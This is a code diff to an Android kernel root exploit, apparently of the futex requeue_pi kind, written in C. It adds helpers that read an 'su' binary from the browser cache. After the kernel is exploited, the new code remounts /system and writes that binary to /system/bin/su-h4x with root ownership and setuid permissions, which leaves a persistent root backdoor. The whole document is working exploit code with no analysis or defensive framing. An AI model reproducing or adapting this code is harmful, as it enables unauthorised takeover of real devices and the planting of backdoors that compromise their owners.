@@ -22,6 +22,7 @@
 #include <arpa/inet.h>
 #include <sys/mman.h>
 #include "log.h"
+#include <assert.h>
 
 #if 0
 struct mmsghdr {
@@ -29,6 +30,10 @@ struct mmsghdr {
     unsigned int  msg_len;
 };
 #endif
+
+#define TMP_SU_H4X "/data/data/com.android.browser/cache/su-h4x"
+#define SYSTEM_SU_H4X "/system/bin/su-h4x"
+#define MOUNT_OPTS "user_xattr,barrier=1,data=ordered"
 
 #ifndef FUTEX_WAIT_REQUEUE_PI
 #define FUTEX_WAIT_REQUEUE_PI   11
@@ -52,6 +57,78 @@ int config_new_samsung = 0;
 int config_iovstack = 4;
 int config_offset = 0;
 int config_force_remove = 0;
+
+void *su_buf;
+ssize_t su_sz;
+
+// https://github.com/euss/ps3tools/blob/master/tools.c
+
+// Copyright 2010            Sven Peter <svenpeter@gmail.com>
+// Copyright 2007,2008,2010  Segher Boessenkool  <segher@kernel.crashing.org>
+// Licensed under the terms of the GNU GPL, version 2
+// http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt
+
+void *read_file(const char *path, ssize_t *sz)
+{
+    int fd;
+    struct stat st;
+    void *ptr;
+    int res;
+
+    fd = open(path, O_RDONLY);
+    if (fd < 0) {
+        LOGD("read_file open failed %d errno: %d '%s'\n", fd, errno, strerror(errno));
+        assert(0);
+    }
+    res = fstat(fd, &st);
+    if (res) {
+        LOGD("read_file fstat failed %d errno: %d '%s'\n", res, errno, strerror(errno));
+        assert(0);
+    }
+    assert(sz);
+    *sz = (ssize_t)st.st_size;
+
+    ptr = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
+    if (!ptr) {
+        LOGD("read_file mmap failed %p errno: %d '%s'\n", ptr, errno, strerror(errno));
+        assert(0);
+    }
+
+    res = close(fd);
+    if (res) {
+        LOGD("read_file close failed %d errno: %d '%s'\n", res, errno, strerror(errno));
+        assert(0);
+    }
+
+    return ptr;
+}
+
+void write_file(const char *path, const void *buf, ssize_t sz)
+{
+    int res;
+    ssize_t sz_written;
+
+    LOGD("write_file path '%s' buf %p sz %d\n", path, buf, sz);
+
+    int fd = open(path, O_RDWR | O_CREAT);
+    if (fd < 0) {
+        LOGD("write_file open failed %d errno: %d '%s'\n", fd, errno, strerror(errno));
+        // assert(0);
+    }
+
+    sz_written = write(fd, buf, sz);
+    if (sz_written != sz) {
+        LOGD("write_file write failed %d errno: %d '%s'\n", sz_written, errno, strerror(errno));
+        // assert(0); 
+    }
+
+    res = close(fd);
+    if (res) {
+        LOGD("write_file close failed %d errno: %d '%s'\n", res, errno, strerror(errno));
+        // assert(0);
+    }
+}
+
 
 int run_shellcode_as_root() {
 
@@ -690,43 +767,35 @@ void hack_the_kernel(int signum) {
 
                 int res;
 
-                #define TMP_SU_H4X "/data/data/com.android.browser/cache/su-h4x"
-                #define SYSTEM_SU_H4X "/system/bin/su-h4x"
-                #define MOUNT_OPTS "user_xattr,barrier=1,data=ordered"
-
-
-                #ifdef CHMODSU
-                LOGD("[ROOT] calling chmod 1\n");
-                res = chmod(TMP_SU_H4X, 0777);
-                LOGD("[ROOT] chmod 1 res = %d\n", res);
-                if (!res) {
-                    LOGD("[ROOT] calling chown\n");
-                    res = chown(TMP_SU_H4X, 0, 0);
-                    LOGD("[ROOT] chown res = %d\n", res);
-                    if (!res) {
-                        LOGD("[ROOT] calling chmod 2\n");
-                        res = chmod(TMP_SU_H4X, 06777);
-                        LOGD("[ROOT] chmod 2 res = %d\n", res);
-                    }
-                }
-                #endif
-
-                #ifdef MVSU
+                #ifdef DROPSU
                 LOGD("[ROOT] calling mount 1\n");
                 res = mount(NULL, "/system", NULL, MS_REMOUNT, MOUNT_OPTS);
                 LOGD("[ROOT] mount 1 res = %d\n", res);
                 if (!res) {
-                    LOGD("[ROOT] calling rename\n");
-                    res = rename(TMP_SU_H4X, SYSTEM_SU_H4X);
-                    LOGD("[ROOT] rename res = %d\n", res);
-                    LOGD("[ROOT] errno = %d '%s'\n", errno, strerror(errno));
+                    LOGD("[ROOT] calling write_file\n");
+                    write_file(SYSTEM_SU_H4X, su_buf, su_sz);
+                    LOGD("[ROOT] write_file done\n");
+
+                    LOGD("[ROOT] calling chown\n");
+                    res = chown(SYSTEM_SU_H4X, 0, 0);
+                    LOGD("[ROOT] chown res = %d errno %d '%s'\n", res, errno, strerror(errno));
+                    if (!res) {
+                        LOGD("[ROOT] calling chown\n");
+                        res = chown(SYSTEM_SU_H4X, 0, 0);
+                        LOGD("[ROOT] chown res = %d errno %d '%s'\n", res, errno, strerror(errno));
+                        LOGD("[ROOT] calling chmod\n");
+                        res = chmod(SYSTEM_SU_H4X, 06777);
+                        LOGD("[ROOT] chmod res = %d errno %d '%s'\n", res, errno, strerror(errno));
+                    }
+
                     LOGD("[ROOT] calling mount 2\n");
                     res = mount(NULL, "/system", NULL, MS_RDONLY|MS_REMOUNT, MOUNT_OPTS);
                     LOGD("[ROOT] mount 2 res = %d\n", res);
                 }
                 #endif
 
-                #if !defined(CHMODSU) && !defined(MVSU)
+
+                #if !defined(DROPSU)
                 // Fork and install the root shell
                 if(fork() == 0) {
                     LOGD("running as pid %d, tid %d, with uid %d", getpid(), gettid(), getuid());
@@ -1331,6 +1400,8 @@ void *trigger(void *arg) {
 int waiter_exploit() {
 
     pthread_t l1, l2, l3;
+
+    su_buf = read_file(TMP_SU_H4X, &su_sz);
 
     LOGV("uid %d\n", getuid());
 
